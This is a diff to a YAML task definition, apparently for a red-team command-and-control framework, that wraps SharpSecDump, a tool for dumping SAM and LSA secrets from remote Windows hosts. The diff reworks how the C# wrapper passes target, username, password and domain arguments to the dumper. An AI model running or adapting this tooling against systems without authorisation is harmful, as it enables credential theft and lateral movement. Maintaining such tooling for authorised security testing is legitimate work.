@@ -1,7 +1,7 @@
 - Name: SharpSecDump
   Aliases: []
   Author:
-    Name: 'Sergio Lázaro, Daniel López & Simone Salucci'
+    Name: Sergio Lázaro, Daniel López & Simone Salucci
     Handle: '@Slazar0, @attl4s, @saim1z'
     Link: ''
   Description: .Net port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump.py
@@ -9,7 +9,7 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net40
-  Code: "using System;\nusing System.IO;\n\nusing SharpSecDump;\n\npublic static class Task\n{\n    public static Stream OutputStream { get; set; }\n    public static string Execute(string Target, string Username, string Password, string Domain)\n    {\n        string output = \"\";\n        try\n        {\n            TextWriter realStdOut = Console.Out;\n            TextWriter realStdErr = Console.Error;\n            TextWriter stdOutWriter = new StreamWriter(OutputStream);\n            TextWriter stdErrWriter = new StreamWriter(OutputStream);\n            Console.SetOut(stdOutWriter);\n            Console.SetError(stdErrWriter);\n             \n            try\n            {     \n                String[] args = new string[0];\n                if (Username != \"\" && Password != \"\" && Domain != \"\")\n                {\n                    args = new string[4];\n                    args[0] = Target;\n                    args[1] = Username;\n                    args[2] = Password;\n                    args[3] = Domain;\n                }\n                else\n                {\n                	args = new string[1];\n                    args[0] = Target;\n                }\n                RegQueryValueDemo.Main(args);\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(\"\\r\\n[!] Unhandled SharpSecDump exception:\\r\\n\");\n                Console.WriteLine(e);\n            }\n            \n            Console.Out.Flush();\n            Console.Error.Flush();\n            Console.SetOut(realStdOut);\n            Console.SetError(realStdErr);\n            OutputStream.Close();\n        }\n        catch (Exception e) { output += e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n        return output;\n    }\n}"
+  Code: "using System;\nusing System.IO;\n\nusing SharpSecDump;\n\npublic static class Task\n{\n    public static Stream OutputStream { get; set; }\n    public static string Execute(string Target, string Username, string Password, string Domain)\n    {\n        string output = \"\";\n        try\n        {\n            TextWriter realStdOut = Console.Out;\n            TextWriter realStdErr = Console.Error;\n            TextWriter stdOutWriter = new StreamWriter(OutputStream);\n            TextWriter stdErrWriter = new StreamWriter(OutputStream);\n            Console.SetOut(stdOutWriter);\n            Console.SetError(stdErrWriter);\n             \n            try\n            {     \n                if (Target != \"\")\n                {\n                	String[] args = new string[0];\n                	if (Username != \"\" && Password != \"\" && Domain != \"\")\n                	{\n                    	args = new string[4];\n                    	args[0] = \"-target=\" + Target;\n                    	args[1] = \"-u=\" + Username;\n                    	args[2] = \"-p=\" + Password;\n                    	args[3] = \"-d=\" + Domain;\n                	}\n                	else\n                	{\n                    	args = new string[1];\n                    	args[0] = \"-target=\" + Target;\n                	}\n                	RegQueryValueDemo.Main(args);\n                }\n                else{\n                	Console.WriteLine(\"\\r\\n[!] SharpSecDump <host> [username] [password] [domain]\\r\\n\");\n                }\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(\"\\r\\n[!] Unhandled SharpSecDump exception:\\r\\n\");\n                Console.WriteLine(e);\n            }\n            \n            Console.Out.Flush();\n            Console.Error.Flush();\n            Console.SetOut(realStdOut);\n            Console.SetError(realStdErr);\n            OutputStream.Close();\n        }\n        catch (Exception e) { output += e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n        return output;\n    }\n}"
   TaskingType: Assembly
   UnsafeCompile: false
   TokenTask: false
@@ -18,8 +18,7 @@
     Value: ''
     DefaultValue: ''
     Description: Target of SharpSecDump
-    SuggestedValues:
-    - -target=
+    SuggestedValues: []
     Optional: false
     DisplayInCommand: true
     FileOption: false
@@ -27,8 +26,7 @@
     Value: ''
     DefaultValue: ''
     Description: Username
-    SuggestedValues:
-    - -u=
+    SuggestedValues: []
     Optional: true
     DisplayInCommand: true
     FileOption: false
@@ -36,8 +34,7 @@
     Value: ''
     DefaultValue: ''
     Description: Password
-    SuggestedValues:
-    - -p=
+    SuggestedValues: []
     Optional: true
     DisplayInCommand: true
     FileOption: false
@@ -45,14 +42,13 @@
     Value: ''
     DefaultValue: ''
     Description: Domain
-    SuggestedValues:
-    - -d=
+    SuggestedValues: []
     Optional: true
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries:
   - Name: SharpSecDump
-    Description: .Net port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump
+    Description: SharpSecDump is a .Net port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump.py.
     Location: SharpSecDump/
     Language: CSharp
     CompatibleDotNetVersions:
